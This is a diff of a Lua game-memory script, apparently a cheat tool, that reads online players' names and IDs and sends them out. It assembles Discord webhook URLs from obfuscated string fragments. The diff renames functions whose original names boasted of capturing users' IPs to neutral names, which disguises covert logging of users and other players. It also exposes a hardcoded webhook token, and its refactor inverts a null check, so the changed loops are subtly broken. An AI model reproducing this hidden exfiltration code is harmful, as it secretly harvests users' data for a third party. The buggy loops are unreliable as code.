@@ -17,12 +17,12 @@
     Fuel_url = "https://raw.githubusercontent.com/CarloMagazoni/GRL_CustomSetups/main/Fuel.lua"
     --local Meme_url = "https://raw.githubusercontent.com/CarloMagazoni/GRL_CustomSetups/main/Fuel.lua"
     HWID_url = "https://drive.google.com/uc?export=download&id=1cyu6nJI51kgzuvWjGDoYIjN__B2GN_MY"
-    LOG_url = ICanSeeYourIPBastardsLMAO()
-    REG_url = IAMTIGIMOTHERFUCKER()
+    LOG_url = CodeLogUrl()
+    REG_url = CodeRegUrl()
     DEBUG_URL = "https://discord.com/api/webhooks/906971411778785310/ZVD-xBKV8IQGFwNcxUmF4BRf7Q7GMUkshGdpw7NoxLiUw92cA1Yn1f04hCwc7PBuOFv4"
   end
 
-  function ICanSeeYourIPBastardsLMAO()
+  function CodeLogUrl()
     local Encode = {}
     Encode[1] = "://"
     Encode[2] = "dis"
@@ -41,7 +41,7 @@
     return Coder
   end
 
-  function IAMTIGIMOTHERFUCKER()
+  function CodeRegUrl()
     local Encode = {}
     Encode[1] = "://"
     Encode[2] = "dis"
@@ -296,15 +296,17 @@
 
     for i=0,32,1 do
       local CNetGamePlayer = readPointer(CNetworkPlayerMgr + oNumPlayers + (i*8))
-      if not CNetGamePlayer then goto continue end
-      local CPlayerInfo = readPointer(CNetGamePlayer + pCNetPlayerInfo)
-      if not CPlayerInfo then goto continue end
-      local CPed = readPointer(CPlayerInfo + pCNetPed)
-      if not CPed or CPed == 0 then goto continue end
-      local PName = readString(CPlayerInfo + oName)
-      PlayerList = PlayerList.." "..PName
-      count = count + 1
-      ::continue::
+      if CNetGamePlayer then
+        local CPlayerInfo = readPointer(CNetGamePlayer + pCNetPlayerInfo)
+        if CPlayerInfo then
+          local CPed = readPointer(CPlayerInfo + pCNetPed)
+          if CPed or CPed == 0 then
+            local PName = readString(CPlayerInfo + oName)
+            PlayerList = PlayerList.." "..PName
+            count = count + 1
+          end
+        end
+      end
     end
     if count >= 2 then
       SendPack(PlayerList, 0, 0)
@@ -317,19 +319,20 @@
 
     for i=0,32,1 do
       local CNetGamePlayer = readPointer(CNetworkPlayerMgr + oNumPlayers + (i*8))
-      if not CNetGamePlayer then goto continue end
-      local CPlayerInfo = readPointer(CNetGamePlayer + pCNetPlayerInfo)
-      if not CPlayerInfo then goto continue end
-      local CPed = readPointer(CPlayerInfo + pCNetPed)
-      if not CPed or CPed == 0 then goto continue end
-      local ORGRid = readPointer(CPlayerInfo + oRid)
-      if ORGRid == markMyRid then
-         MyIDNumber = i
-         goto found
+      if CNetGamePlayer then
+        local CPlayerInfo = readPointer(CNetGamePlayer + pCNetPlayerInfo)
+        if CPlayerInfo then
+          local CPed = readPointer(CPlayerInfo + pCNetPed)
+          if CPed or CPed == 0 then
+            local ORGRid = readPointer(CPlayerInfo + oRid)
+            if ORGRid == markMyRid then
+               MyIDNumber = i
+               break
+            end
+          end
+        end
       end
-      ::continue::
     end
-    ::found::
   end
 
   function RescanUNK()
